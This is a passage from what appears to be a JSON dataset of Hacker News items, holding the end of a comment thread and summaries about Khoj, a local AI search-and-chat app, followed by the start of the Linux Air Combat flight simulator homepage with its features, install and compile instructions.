use case for “smart” eyeglasses? Audio as the input at first, have the audio files sync wirelessly to your phone, and apply the ML transcription and prompt keys locally.replyfragmede 13 hours ago | root | parent | prev | next [–] rewind.ai might be able to helpreplythangngoc89 11 hours ago | prev | next [–] I’m in search of a new Macbook Mx. what is the requirements for running these model locally without breaking the bank? Would 32GB be enough?reply110 8 hours ago | parent | next [–] You do not need to break the bank to use Khoj for local chat, 16Gb RAM should be good enoughreplyDoctorOetker 11 minutes ago | root | parent | next [–] How slow would that be on an old non-Apple laptop, but also 16Gb RAM?lscpu output: Architecture: x86_64CPU op-mode(s):32-bit, 64-bitAddress sizes: 36 bits physical, 48 bits virtualByte Order:Little EndianCPU(s): 8On-line CPU(s) list: 0-7Vendor ID: GenuineIntelModel name:Intel(R) Core(TM) i7-3630QM CPU @ 2.40GHzCPU family:6Model: 58Thread(s) per core:2Core(s) per socket:4Socket(s): 1Stepping:9CPU(s) scaling MHz:35%CPU max MHz: 3400.0000CPU min MHz: 1200.0000BogoMIPS:4791.90Flags: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cp uid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm cpuid_fault epb pti ssbd ibrs ibpb stibp tpr_shadow vnmi flexpriority ept vpid fsgsbase smep erms xsaveopt dtherm ida arat pln pts md_clear flush_l1dL1d: 128 KiB (4 instances)L1i: 128 KiB (4 instances)L2:1 MiB (4 instances)L3:6 MiB (1 instance)NUMA:NUMA node(s):1NUMA node0 CPU(s): 0-7replymarcus_holmes 9 hours ago | prev | next [–] Any chance it can look at Gitlab as well? I like the idea but I'm not giving all my work to Microsoft.replyLanternLight83 19 hours ago | prev | next [–] It's funny that you mention `C-s`, because `isearch-forward` is usually used for low-latency literal matches. In what workflow can Khoj offer acceptable latency or superior utility as a drop-in replacement for isearch? Is there an example of how you might use it to navigate a document?reply110 19 hours ago | parent | next [–] That's (almost) exactly what khoj search provides a search-as-you-type experience but with a natural language (instead of keyword) search interface.My workflow looks like: 1. Search with Khoj search[1]: `C-c s s`RET 2. Use speed key to jump to relevant entry[2]: with `n n o 2`[1]: `C-c s` is bound to `khoj` transient menu [2] https://orgmode.org/manual/Speed-Keys.htmlreplyBlackthorn 11 hours ago | root | parent | next [–] Can you elaborate on that a little bit? When you search like that, what do you type in to find stuff in a programming language source file? I'd like to better understand this workflow, it seems interesting and I might be missing out.replyasynchronous 19 hours ago | prev | next [–] This is very cool, the Obsidian integration is a neat feature.Please, someone make a home-assistant Alexa clone for this.reply110 19 hours ago | parent | next [–] Thanks!We've just been testing integrating over voice, whatsapp over the last few days[1][2] :)[1]: https://github.com/khoj-ai/khoj/tree/khoj-chat-over-whatsapp...[2]: https://github.com/khoj-ai/khoj/compare/master...features/wh...replyyberreby 13 hours ago | prev | next [–] Cool project. I tried it last time this got posted, but it was still a bit buggy. Giving it another shot - I'm mainly interested in the local chat.Could you elaborate on the incremental search feature? How did you implement it? Don't you need to re-encode the full query through a SBERT or such as each token is written (perhaps with debouncing)?Also, having an easily-extended data connector interface would be awesome, to connect to custom data sources.replybozhark 19 hours ago | prev | next [–] I’m not a software dev.Is there a way to have this bot read from a discord and google drive?replysyntaxing 18 hours ago | parent | next [–] gpt4all itself (the library on the backend for this) has a similar program [1]. You just need to put everything into a folder. This should be straight forward for google drive. Harder for discord though but I’m sure theres a bot online that can do the extraction.[1] https://gpt4all.io/index.htmlreplyjigneshdarji91 18 hours ago | prev | next [–] This would be even great if available as a Spotlight Search replacement (with some additional features that Spotlight supports).replytough 18 hours ago | parent | next [–] Should be easy to plug it in with a Raycast.app or Alfred.app plugin.replythrow03172019 12 hours ago | prev | next [–] Feedback for landing page: use a fixed height container for the example prompts. Without it, it causes jumping while scrolling down the page making other sections hard to read. iOS SafarireplyHypergraphe 6 hours ago | prev | next [–] Hi, my dream app ! Will it work on non english sources ?replycalnayak 16 hours ago | prev | next [–] How does one access this from a web browser?replysabakhoj 15 hours ago | parent | next [–] We have a cloud product you can sign up for, but it's more limited in what data sources it supports. It currently only works for Notion and Github indexing. If you're interested in that, send me a dm on Discord - https://discord.gg/BDgyabRM6eBut that would allow you to access Khoj from the web.replyIshKebab 17 hours ago | prev | next [–] Interesting. The obvious question you haven't answered anywhere (as far as I can see) is what are the hardware requirements to run this locally?reply110 16 hours ago | parent | next [–] Ah, you're right, forgot to mention that. We use the Llama 2 7B 4 bit quantized model. The machine requirements are:Ideal: 16Gb (GPU) RAMLess Ideal: 8GB RAM and CPUreplyHexDecOctBin 5 hours ago | root | parent | next [–] Sorry for the repetition, but do you mean 16 GB VRAM? That is a very high requirement, a RTX 4060 only has 8GB and even a RTX 4070 only ships with 12GB. Any upcoming further optimizations for reducing memory usage?PS. Nice to see an Hindi name for a software. For those who don't speak Hindi: https://en.m.wiktionary.org/wiki/%E0%A4%96%E0%A5%8B%E0%A4%9C...replydanparsonson 13 hours ago | root | parent | prev | next [–] So just to clarify, is that: Ideal is running the model on a GPU (any brand? Nvidia, AMD, etc.?) with 16GB of GPU RAM, less ideal is running it on the CPU, for which it needs 8GB system RAM? Presumably it will occupy all that memory while it's running?What about if I have a GPU with 8GB?reply110 12 hours ago | root | parent | next [–] Khoj uses Llama 2 7B, 4bit quantized. So it just needs 3.5Gb of RAM (GPU or System) [1].Khoj and your other apps need more RAM themselves, so practically 8GB of System or GPU RAM should suffice.Khoj has been tested with CUDA and Metal capable GPUs. So Nvidia and Mac M1+ GPUs should work. I'm think it'll work with AMD GPUs out of the box too but let me know if it doesn't for you? I can look into what needs to be done to get that to work.[1]: The calculation is [params] * [bytes] GB RAM, so 7 * 0.5 = 3.5Gbreplyumanwizard 17 hours ago | prev | next [–] Markdown doesn't work on HN...replyramesh31 18 hours ago | prev | next [–] Something I've noticed playing around with Llama 7b/13b on my Macbook is that it clearly points out just how little RAM 16GB really is these days. I've had a lot of trouble running both inference and a web UI together locally when browser tabs take up 5GB alone. Hopefully we will see a resurgence of lightweight native UIs for these things that don't hog resources from the model.replysabakhoj 13 hours ago | parent | next [–] FWIW I've also had browser RAM consumption issues in life, but it's been mitigated by extensions like OneTab: https://chrome.google.com/webstore/detail/onetab/chphlpgkkbo...For now, local LLMs take up an egregious about of RAM, totally agreed. But we trust the ecosystem is going to keep improving and growing and we'll be able to make improvements over time. They'll probably become efficient enough where we can run them on phones, which will unlock some cool scope for Khoj to integrate with on device, offline assistance.replythenickdude 14 hours ago | parent | prev | next [–] The new Chrome \"memory saver\" feature that discards the contents of old tabs saves a lot of memory for me. Tabs get reloaded from the server if you revisit them.replyKwpolska 17 hours ago | parent | prev | next [–] Or hopefully we will see an end of the LLM hype.Or at least models that don’t hog so much RAM.replyramesh31 17 hours ago | root | parent | next [–] >Or at least models that don’t hog so much RAMThe RAM usage is kind of the point though; we're trading space for time. It's not a problem that the model is using it, it's just that with the default choice for UI being web based now, the unnecessary memory usage of browsers is actually starting to be a real pain point.reply110 16 hours ago | root | parent | next [–] 1. I hear you on going back to lightweight native apps. Unfortunately the Python ecosystem is not great for this. We use pyinstaller to create the native desktop app but it's a pain to manage.2. The web UI isn't required if you use Obsidian or Emacs. That's just a convenient, generic interface that everyone can use.replymatmulbro 19 hours ago | prev | next [2 more] Ilnsk 18 hours ago | prev [3 more]",
    "originSummary": [
      "Khoj is a desktop application developed by Debanjum and Saba.",
      "It provides incremental search and chat features for personal notes, documents, and images.",
      "Khoj supports different content types and can be accessed through Emacs, Obsidian, or a web browser.",
      "The chat feature enables users to extract answers from their knowledge base.",
      "The search feature utilizes natural language.",
      "Khoj is an open-source application that works offline.",
      "Desktop apps are available for beta testing.",
      "The creators encourage user feedback."
    ],
    "commentSummary": [
      "Khoj is a desktop application that allows users to search and chat with their personal notes, documents, and images.",
      "The application supports various content types and uses chat models for conversational interactions.",
      "Users on Hacker News are providing feedback and suggestions for improvement.",
      "Developers are actively working towards addressing these suggestions.",
      "Discussions on Hacker News include ideas for using technology to record and transcribe daily activities for personal organization.",
      "Users also discuss memory problems and the need for better tools to retrieve and organize personal data.",
      "Some users express concerns about high RAM usage.",
      "The developers mention plans for improvement and integration with offline assistance."
    ],
    "points": 497,
    "commentCount": 109,
    "retryCount": 0,
    "time": 1690737262
  },
  {
    "id": 36934029,
    "title": "Linux Air Combat: free, lightweight and open-source combat flight simulator",
    "originLink": "https://askmisterwizard.com/2019/LinuxAirCombat/LinuxAirCombat.htm",
    "originBody": "LINUX AIR COMBAT This is a free, open-source combat flight simulator developed by AskMisterWizard.com for the LINUX community. Its roots came from the well-known \"classic\" flight game known as \"GL-117\", but this new incarnation has been extensively re-written and improved, and the focus has changed from arcade gaming to World War II combat flight simulation. Current Released versions: 9.15.  Each version is also available as an \"AppImage\" containing a single, universal, compiled binary file ready for immediate use with no need to compile or install  (Learn more about AppImages from our forum HERE). It runs nicely on almost any kind of computer that can run any popular version of desktop Linux, ranging from Raspberry Pi through \"Steam Deck\" and on up to super gaming-class machines. Page updated 24Apr2023   (Click the images to see a larger version) New: LAC is now available in a special, precompiled, optimized version for Valve Corporation's fabulous \"Steam Deck\" portable gaming PC. All of the controls are configured by default for best use, and it's easy to fly in LAC's online, multi-player, server-based missions without ever needing a keyboard. Even voice comms among players are supported! CLICK HERE for more information. LINUX AIR COMBAT is now officially released and available in stable, \"production\" quality, and official and semi-official LINUX Repositories are beginning to support it! Universal compiled binary versions are now available for unlimited testing!  LINUX AIR COMBAT is also known as \"LAC\", and this is the home page for everything about LAC.LAC is very efficiently coded for \"speed at any price\". We've been watching development of the very popular, very affordable \"Raspberry Pi\" computers. During the last few years these tiny little computers have become increasingly powerful and, since December of 2020, we have confirmed that the current \"Pi\" has sufficient power to run LAC sweetly! CLICK HERE for more details.CLICK HERE for a very brief YouTube clip showing a low pass over an airfield and through a hangar while the air raid siren blares. CLICK HERE for a brief YouTube video with basic LAC flight training. CLICK HERE for important YouTube instruction on selection of online targets. CLICK HERE for a YouTube playlist with video tours of all 54 of the World War II aircraft simulated by Linux Air Combat. CLICK HERE for a YouTube clip showing what it's like to fly online versus \"Replay Blokes\" when no other sentient players are active online. CLICK HERE for a narrated, fun fighter furball in \"Blake's Mission\" from July 2022 CLICK HERE for a fun, 2-player network mission example from July 2019. CLICK HERE for a comprehensive network mission example. This 37-minute clip shows what it's like to fly a complex, strategic, multi-player mission with lots of inter-player communication to develop and coordinate tactics. This is a great clip for those needing an introduction to the complexities, tools, and tactics used online. CLICK HERE for a comprehensive YouTube tour of LAC's cockpit instruments. CLICK HERE for important training on LAC's interplayer voice communication and associated keyboard commands (YouTube). CLICK HERE for basic training on LAC's standard, simple, text-mode interplayer communication featuring our \"Morse Radio\" (YouTube). CLICK HERE for advanced training on LAC's \"promotion\" system, and associated Morse Radio commands (YouTube). CLICK HERE for our YouTube Playlist with a huge collection of video clips about LAC, documenting its development and improvement during the past 6 years (latest clips at the end of the list). CLICK HERE for our YouTube Playlist with exciting online combat samples from 2022 (latest clips at the end of the list). CLICK HERE for our YouTube Playlist with exciting online combat samples from 2023 (latest clips at the end of the list).LAC is now MATURE and ready for widespread LINUX distribution!People have been asking to have this included in mainstream LINUX distributions and repositories. We're flattered to have that attention, and for almost 6 years we were asking for your patience as we got it ready for \"prime time\". We are very pleased to confirm that official development of stable, \"production-quality\" Linux Air Combat is completely FINISHED. We're DONE adding features, and the little bugs and tweaks of recent releases have been so tiny as to confirm LAC's mature status. All versions since November 15, 2019 remain mutually interoperable, and recent versions have proven to be very stable on a wide variety of LINUX distros.CLICK HERE for a discussion in our forums about LAC in LINUX Repositories that ends with a list of Repositories already supporting it.Accordingly it is now appropriate for LINUX users to ask their own distribution managers and packagers to include it. Then, if those people need help, refer them to the discussion HERE. They can also contact us by email (webmaster@AskMisterWizard.com) and we will be glad to assist. In the meantime, the best way to get LAC is to download it from the prominent link advertised at the top of this web page, or from SourceForge.net.    NEW SINCE AUG2022: Most new users will no longer find it necessary to compile LAC from source code. As of this writing we have published compiled binary version 9.15 in the well-known, universally compatible \"AppImage\" format and we have seen widespread success and proven, full binary compatibility with the vast majority of Linux Distros for \"x-86\" hardware. With this new \"AppImage\" option, obtaining and testing Linux Air Combat is a simple matter of downloading one file, marking it as executable, and running it. No compiling and no installation! Learn more in our forums HERE.Now available for free Internet download, this new, high-performance flight simulator is now \"feature-complete\", and supports all of the basics demanded by today's LINUX flight sim users, including:Free and open source distribution. The clean source code compiles without modification on major LINUX distros. Precompiled binary version in the well-known, universally compatible \"AppImage\" format is in widespread use.Very smooth, simple, high-performance graphics yield high frame rates even on modest computer hardware (runs nicely on Raspberry Pi).45 flight/view functions can be mapped to any detected joystick axis, button, or keyboard key. Modern, multi-axis analog/digital joysticks and console game controllers support precision control of elevators, ailerons, rudder, throttle, etc. Mouse control of elevators, ailerons, and weapons for those lacking a joystick.54 different flyable aircraft from World War II. A theoretical Jet fighter with performance similar to the Douglas A4 \"Skyhawk\".Industry-standard \"Air Warrior\" style viewsystem is easily configurable for other view options.Sophisticated flight model with stalls, high-speed compressibility, high-G blackouts, torque rolls, low-speed control fade, and redouts. Realistic high-altitude degredation of engine performance. Fuel consumption is proportional to engine load including WEP/Afterburner effects. Flight performance is degraded when lugging heavy bombs, missiles, or rockets. Flight performance is degraded when aircraft are damaged.Simulated RADAR to help locate opponents. Players can hide from RADAR by flying at low altitudes (in canyons and valleys).Enemy airfields and RADAR facilities can be damaged or destroyed.Simulated IFF to help Identify Friend verses Foe. Guns combat. WW2-era Air-to-Ground rockets. WW2-era bombs.Free flight mission. Four tutorial missions with detailed audio narration to help beginners get a quick start.Online \"Head to Head\" mission suitable for air racing or combat (2 players only. No server required.). Free, high performance Linux Air Combat Server is now available at LacServer2.LinuxAirCombat.com.Three \"classic\", ten-player Internet missions in various terrains, with strategic airfield combat (Internet and access to a free LAC Server required). \"Blake's Mission\" for quick, pure air-to-air combat among 2 to 10 fighter aircraft without complications from ground guns or strategic assets. \"Peabody's Mission\" for longer-lasting, deeper strategic conflicts requiring destruction of additional airbases.Additional, more sophisticated, multi-user missions are added from time to time, as they are developed from the open source code.When only one online player is active in ten-player missions, \"bots\" are locally generated for opposition until another online player joins.Users can record \"GunCamera films\" and ask the Server to replay them as persistent \"Server Missions\". 32 distinct, online Realms, each supporting unique missions and/or communities. Realm \"1\" constantly runs persistent Server \"Strike\" missions with heavy bombers to escort, or to oppose.User-loadable graphic aircraft models support the free, open, well-known \".3ds\" format. User-loadable background music, sound effects, and narration files support industry-standard \".wav\" format. \"Talking Cockpit\" can verbalize target location so you can hear it without diverting your eyes. Innovative \"Network Router Panel\" on cockpit shows network telemetry and comms data flow from other players. Best-of-breed network user management with interplayer status messages on the cockpit panel.Powerful integration with \"Mumble\" for world-class voice communication between players. Dedicated Mumble server manages a rich heirarchy of voice radio channels and online help. \"Promotion\" to team leadership allows one player to command automated Mumble channel switching for entire teams.Automated radio messages verbalize enemy airfield status when Mumble Radio is properly tuned.23 Comms-related functions can be mapped to almost any keyboard key. Text-only, low-bandwidth comms option acts like a \"Morse Code\" radio, generating real Morse code. Morse Code radio can apply interference filters to allow or eliminate text messages from opposition.Airfields with defensive guns challenge nearby opponents and protect nearby allied aircraft. Airfield defenses can be damaged and degraded with bombs, rockets, missiles, and/or machine guns. Damaged airfield defenses are gradually repaired by surviving airfield maintenance personnel. Airfield repairs are accelerated if nearby skies are dominated by allies, and stopped when dominated by opponents.Air raid sirens blare loud on damaged airfields.Bombers have autogunners that take shots at nearby hostile fighters. \"Norden\" bombsight emulation makes precision, medium or high altitude bombing possible. Realistic bomber climb rates:  Heavily loaded bombers need a long time to climb to altitudes high enough to avoid fighters.Realistic bomb-run tactics make heavy bombers vulnerable to opposing fighters during critical mission segments.Heavy bombers can destroy an airfield in a single sortie if well flown and undamaged by opposing fighters. Real-time, automated radio and RADAR warnings alert players when their airfields are threatened by strategic bombers. Online users can choose their own unique \"CommunityHandle\" name, and see the names of other players .Log file stored on the player's computer keeps a detailed history of all online victories. Stable source code is now available for porting into LINUX distributions and repositories.Supported by an active development team for bug fixes. Extensive, high-quality online documentation is fully integrated into the sim. Extensively documented on YouTube.On the runway, ready for takeoff, after refuel, re-arm, and repair operations, near a friendly P38 and behind a B29.Linux Air Combat is free software that we donate to the world. We are writing and supporting this stuff because we love to do so. However, there are limits on the amount of time we can spend on this project. You can help! LAC is advertising-supported. Our efforts are funded by the modest advertising revenue we receive from these LAC pages, related YouTube video clips, and from our web site AskMisterWizard.com. All we ask is that you give our online publications a chance. All are loaded with very high quality instructional videos about technology, flight simulation, and networking. Please be fair with our advertisers. We keep scripting to an absolute minimum, and we don't clutter up the site with excessive ads. If you see an ad that you don't like, please DON'T click on it. That will help our advertisers figure out the kinds of ads that please our viewers. On the other hand, if you see an ad that shows something of real interest to you, please consider exploring it in detail and giving the advertiser a fair, honest share of your attention. When you do that, everybody wins, and we can spend more time improving and supporting LINUX AIR COMBAT.  Thanks!   Two narrated YouTube Movies showing network players enjoying a \"Server Mission\" with the version of LAC that was current as of Jul2023. Lots of instructive radio banter, and lots of of air-to-air violence! LAC is now the world's leading open-source combat flight simulator for LINUX!  Two screen shots. First, an online skirmish versus a Mitsubishi \"Zero\".  Second, an airstrip overflight, using external view. Click images to see a larger, more detailed version. Flight controls for LINUX AIR COMBAT. The default configuration is set up for a numeric keypad, standard keyboard, and the popular, inexpensive Logitech Extreme 3dPro joystick as illustrated above. It is possible to reconfigure for a different joystick, a USB console-style game controller, or to use a generic \"mouse pointer\" instead. Keyboard keys are also reconfigurable and/or interchangeable with joystick buttons. In general it is possible to assign almost any joystick button, controller button, axis, or keyboard key to any arbitrary flight or view function. It is also easy to reconfigure a typical joystick \"hat switch\" to configure view directions, etc. Further instruction is available in video tutorials below, and from these links that are also available within the sim.       Screenshots showing LINUX AIR COMBAT in actionFree, multiplayer online access is now available, based on new Linux Air Combat official Release V9.15. In December of 2015, AskMisterWizard.com announced availability of our new, free, open source flight simulator for LINUX,  now known as \"LINUX AIR COMBAT\". The first published version was alpha test number 1.99. Since then, we've continued to add features, fix bugs, and enhance the flight models.  As of this writing, the current production version is 9.15 (for global installation in the /usr filesystem for all users), supporting 54 aircraft (download link below).  Version 9.15 is also available in precompiled, binary-only format, configured for (almost) universal compatibility by virtue of the well-known \"AppImage\" tools and format. Click HERE to see the Linux Air Combat ChangeLog, with text and video summaries documenting all of the changes that have been implemented in each published version. Most of our development work has been done on 64-bit versions of the well-known \"PcLinuxOs\", \"Ubuntu\", and \"Manjaro\" Linux distributions. Testing has confirmed that some of the resulting, conventionally compiled binaries are compatible with some other, popular LINUX distributions. However, this binary compatibility is dependent upon many factors including the version of compiler and the versions of required function libraries in use. Click HERE for our discussion group focused on new versions of LAC that are available as precompiled executables formatted for near-universal compatibility with all popular desktop versions of LINUX according to the well-known \"AppImage\" format. Full source code is available for download so that users of any LINUX distribution can easily compile it for their use (See the \"Compiling\" section below). If your LINUX system is substantially out of the mainstream you may find that none of our published binary versions will work for you. In that case, compiling from source code is generally the best way to ensure compatibility. This sim is still fully supported by the development team, but all of the planned features are now in place. We are proud to declare that LAC now offers excellent hardware and software compatibility, an easy-to-learn standard control layout, good customizability, excellent frame rates, respectable and credible flight models, exciting multiplayer combat,  immersive multiplayer missions,  truly world-class multi-user player management with correspondingly powerful voice comms, and near-universal binary compatibility to minimize any need to compile from source code. This is the most compatible online combat flight simulator ever published. It works well on virtually any LINUX desktop system ranging from Raspberry Pi on up to monster gaming-class. The widest practical array of flight controllers are also supported, ranging from keyboard/mouse on up through USB \"console-style\" game controllers and traditional aircraft-oriented joysticks. While we've been making all of these improvements, we've also developed a \"Linux Air Combat Server\" that is now available for free public use. In late June 2017, that server completed the first phase of beta testing, and a high performance hosting service now has it available at LacServer2.LinuxAirCombat.com.  Everybody with a recent copy of Linux Air Combat (since November of 2019) can now participate with us in any of our free, ten-player online missions.  Prerequisites for running a compiled, binary version of LINUX AIR COMBATThis flight simulator is distributed in both source code and binary executable formats for various LINUX distributions. (People that want to compile it will find additional help in the next section of this document.) For those that DON'T want to compile it, we offer three options:1 of 3: Several popular desktop LINUX distros offer LAC in their Repositories. (CLICK HERE for more information). 2 of 3: A binary \"AppImage\" that works on most distros (CLICK HERE for more information). or: 3 of 3: Precompiled binary images bundled into our robust install kits that also include source code.For compatibility with the precompiled binary versions according to option \"3 of 3\" above, LAC requires each of these well-known, popular LINUX libraries and tools, which are generally preinstalled in most major LINUX desktop distributions:libfreeglut3 libSDL1.2_0 libSDL_mixer1.2_0 libmesaglu1 libmesa As of April 2018, some of those prerequisites are NOT pre-installed on Ubuntu desktop Linux, but it is very easy to obtain them using the well-known \"apt-get\" command.  For example, the commands to install three of those prerequisite libraries, issued into a bash command shell, are:sudo apt-get install freeglut3 sudo apt-get install libsdl1.2debian sudo apt-get install libsdl-mixer1.2If LINUX is new to you, CLICK HERE to go to our YouTube playlist loaded with introductory information that can get you started.Additional Prerequisites for compiling your own version from the LINUX AIR COMBAT source codeIf you want to compile LAC, you will find that the well-organized source code makes this very easy, even for non-programmers. In addition to the prerequisites listed above, you will also need gcc (almost always present),  and all of these tools and libraries, which are generally NOT preinstalled in most major LINUX desktop distributions:gcc-c++ Code::Blocks (recommended, but not required)Libfreeglut-devel libSDL-devel (for SDL version 1.2)libSDL_mixer-devel (also for SDL version 1.2) As of April 2018, some of those compiling prerequisites are NOT pre-installed on Ubuntu desktop Linux, but it is very easy to obtain them using the well-known \"apt-get\" command.  For example, the commands to install three of those prerequisite libraries, issued into a bash command shell, are:sudo apt-get install freeglut3-dev sudo apt-get install libsdl1.2-dev sudo apt-get install libsdl-mixer1.2-devFor those that want to compile LAC on Ubuntu desktop LINUX, we urge you to use the \"CodeBlocks\" method as described in our \"Ubuntu and LAC\" forum here:https://sourceforge.net/p/linuxaircombat/discussion/ubuntuandlac/Experienced LINUX users will recognize all of these as well-known LINUX components. However, the exact names of these tools can vary among different LINUX distributions, or even as distributions are updated. You will need to adapt the names of the libraries listed above according to the names in use on your LINUX variant.For most of the popular LINUX desktop distributions, every one of these components will be freely available through the usual and customary means, using free package managers. If you have a good Internet connection, you should be able to get everything within 5 or 10 minutes and with just a few mouse clicks. For best compatibility with other members of our online community, you will want to make sure your libraries are up-to-date.  For a YouTube video showing how we obtained tools to compile a very similar project, CLICK HERE.Compiling LAC should be easy. In our experience, it is NEVER necessary to change even a single line of the source code. The real trick is obtaining the correct prerequisite library files. (One source of potential confusion derives from the fact that SDL libraries are available in two distinct versions. We use the \"classic\" version 1.2. Nowadays all of the major LINUX desktop distros provide SDL libraries for both version 1.2 and for the newer version 2.0. LAC doesn't care if you have both versions, but the current, production version of LAC absolutely requires SDL version 1.2)  Furthermore, the standard, well-known, free software library tools that LAC uses are routinely updated from time to time. If you will be using our conventionally precompiled version on any compatible type of desktop LINUX, you may experience odd errors unless your LINUX is using the same version of the required libraries. Further details about compiling LAC can be found in FAQ #2 HERE.Hardware CompatibilityLINUX AIR COMBAT hardware requirements are modest (it will even run nicely on the smallest, least expensive version of the well-known, extremely economical \"Raspberry Pi Model 4b\" and on the new \"Raspberry Pi Model 400\"). When using hardware that was originally intended for use with Microsoft \"Windows\", one gigabyte of RAM and an old Celeron or Pentium processor should suffice. Six levels of graphic detail are available from a prominent configuration menu. When configured to display in a small window with the simplest available graphics, almost any desktop or laptop PC built since about 2006 should be able to run it with acceptable frame rates on any of the popular LINUX distributions. Full-screen, high definition video using the higher graphical levels (levels 4 and 5) will require an accelerated graphic card of the type made popular by nVidia, Intel, or ATi, but you won't need a really expensive card. We've had great success with cards that cost U.S. $50.00 or less.In order to enjoy LAC's features to the fullest, try to tune its graphic options so that it reports 60 Frames per second most of the time. For the best, smoothest performance, we recommend a version of LINUX using a lightweight desktop manager. LAC's demands are modest, but if your desktop manager is heavily burdened before LAC is even installed, there is nothing LAC can do to speed things up. When everything is optimized, the silky smooth \"feel\" of LAC is amazing and almost hypnotic!LINUX AIR COMBAT is intended for joystick flight controls. Joystick axes, joystick buttons, and almost any keyboard key can be mapped to any of 45 different flight functions and 23 comms functions, so you will be able to set up your controls to your liking. A joystick (like the popular, inexpensive Logitech Extreme 3dPro) is HIGHLY recommended, but it is possible to control LINUX AIR COMBAT with just a keyboard and mouse, or to use a \"Console Game Controller\" connected via USB (wired or wireless). Downloading   New since 15Nov2019! Development is completed, and \"production releases\" of LINUX AIR COMBAT can be downloaded for free public use.Recent improvements result in greater program stability, better support for players lacking a joystick, improved visual perception of network jitter, better support for laptop-style keyboards, easy access to online documentation without exiting from LAC, more robust player management, more robust handling of aircraft damage in flight, penalties for online \"fratricide\", more realistic flight modeling, more lethal guns and ordnance, additional multi-player missions, and more powerful menu logic allowing easy cycling of RedTeam/BlueTeam affiliation without exiting from LAC, all while retaining operational compatibility with all of the previous production missions and releases.For those that DON'T want source code and have no interest in compiling LAC, we now offer a binary version that has been precompiled for (almost) universal compatibility with popular desktop LINUX distros. CLICK HERE for related details.CLICK HERE to go to our Installers folder to download the latest, experimental versions.CLICK HERE for new information from our forums about a few official or semi-official LINUX Repositories already supporting LAC for certain desktop LINUX distros. If your distro has a Repository offering LAC, you'll find this to be the easiest, simplest, best-supported installation method.CLICK HERE  for the stable, compressed installation archive from our \"SourceForge\" distribution site. Check the detailed, descriptive text carefully to make sure you select the most appropriate version for your needs. Every full, robust download version contains:-- A compiled copy of Linux Air combat in the bin/Release subfolder (this version was compiled for 64-bit PcLinuxOs. It may or may not work on other LINUX distributions)-- An installation script named \"install.sh\" that will install and configure Linux Air Combat. -- All of the source code necessary to compile or customize your own version of Linux Air Combat -- A \"Codeblocks Project File\" to make it easy to use the free, well-known \"Codeblocks\" compiler GUI -- A \"Makefile\" for programmers that prefer to compile Linux Air Combat without downloading or installing CodeBlocks -- One or more alternative Makefiles (in case our primary Makefile doesn't work on your distro)-- A set of additional subfolders containing all other necessary resources After downloading any of our distribution archives, you will find a new \"*.tar.gz\" file in your designated download directory.Decompress the tar.gz file to produce the associated .tar file. Then de-archive the tar file according to well-established LINUX norms. You can store the resulting, new directory tree structure anywhere you want it within your home filesystem (so long as you can remember where you put it). Once you've de-archived the tar and tar.gz archives, it's OK to delete them.Also note that several configuration files must be installed in specific filesystem locations before the compiled, executable program will run without errors. The first time you execute LAC, it will attempt to store and access all of those files appropriately. CLICK HERE to enter our \"Compiling and Installing LAC\" forum, where users publish helpful instructions, comments, and video clips documenting their successes.Please note that although a compiled, executable copy of LINUX AIR COMBAT is included in your standard \"Full Kit\" LAC download, it was compiled on a 64-bit PcLinuxOs system and may not work on other distributions. Since most people are using different LINUX versions, most will need to compile the source code to produce an appropriate executable version. Unlike other flight simulators, it is easy to compile LINUX AIR COMBAT, and you can even do it all from within a friendly, graphical environment without arcane text commands. Look for other, comprehensive resources through numerous links on this page for detailed instructions and video clips showing exactly how thousands of people have done it.If you install LAC from one of our \"Full Kit\" install archives, within the top-level de-archived folder, you should find an executable shell script named \"install.sh\", which automates the install process the easy way. You are ready to run that shell script after you compile the sourcecode  or otherwise obtain the appropriate executable version of LAC.Running that shell script from a command window like /bin/bash will copy all of the required files into the appropriate locations and configure the appropriate binary executable program to run on your computer.  CLICK HERE for more background on downloading, compiling, installing, and configuring LAC on a wide variety of LINUX distros.   Also within that top-level de-archived folder, you should find full source code and an associated \".cbp\" file to configure the free, well-known \"CodeBlocks\" Integrated Development Environment, making it easy for you to compile and/or modify your own version of this software. (Alternatively, if you don't want to use CodeBlocks, you can use our \"Makefile\" to compile Linux Air Combat according to the usual and customary norms. This method is not compatible with as many LINUX systems as the \"CodeBlocks\" method due to minor differences among c++ compilers.)Compiling from Source CodeLinux Air Combat is FAR EASIER to compile and modify than any comparable flight simulator. The source code is exceptionally well organized for easy compilation on almost any PC running a desktop version of Linux.CLICK HERE for our easy, detailed compilation instructions and video examples for beginners. CLICK HERE for additional compiling resources. Online Play and the Linux Air Combat CommunityThe community of flight simulator fanatics is small among desktop LINUX Users. At the time of this writing, only a few people know about Linux Air Combat's new online server. We generally gather online on Thursday evenings, from about 6PM until 8:00 or 9:00 PM Central USA time, but the server is up constantly, and you might find players anytime. Please help us pass the word. Invite your friends to join you online as we build up this community from its tiny state. At first, everybody will have trouble finding others with whom we can fly. This will only succeed if we all bring friends into the emerging new \"LAC Community\". Recent online activity and improvements have focused on \"Network Battle 02\", \"Network Battle 03\"  and on \"Peabody's Mission\" in Realm \"1\". You are more likely to find other players in those missions than in any of the others, and they are usually populated by a new set of \"Replay Blokes\" from \"Server Missions\" even when no other human players are active.  If you are the only online player in most of the other online missions, LAC will populate the mission with \"bot\" players (generated on your own computer) to serve as your allies and as your opposition. Although those bots aren't very smart,  you can use them for target practice and to hone your tactical skills until some more online players join your mission. How to enjoy LAC's online missions when you are the only online human player. Lockheed P38L \"Lightning\" ready for Takeoff! Aircraft selection is done from a prominent menu. Each option summarizes the attributes of one of LAC's flyable planes.Voice Communication with other LAC playersFor your convenience communicating with others in the LAC Community, AskMisterWizard.com sponsors a Mumble server, so you will benefit greatly from the free, well-known \"Mumble\" Internet voice client application. Good Mumble clients are available for many popular operating systems including LINUX, Apple/IOS, Android, MacOS, and Windows. Install it on your PC, Macintosh, Windows machine, phone, or tablet. Use Mumble to find other online players, to arrange online missions with them, to communicate with other LAC users during flight, or just to chat about LAC with other users or developers. Because LAC is new and the server is now supporting only a small community of users, you will naturally want to know if anybody else is flying, and the realms and missions in use. Our Mumble Server serves as your \"home base\" for these activities. You and your friends can connect to our Mumble server at 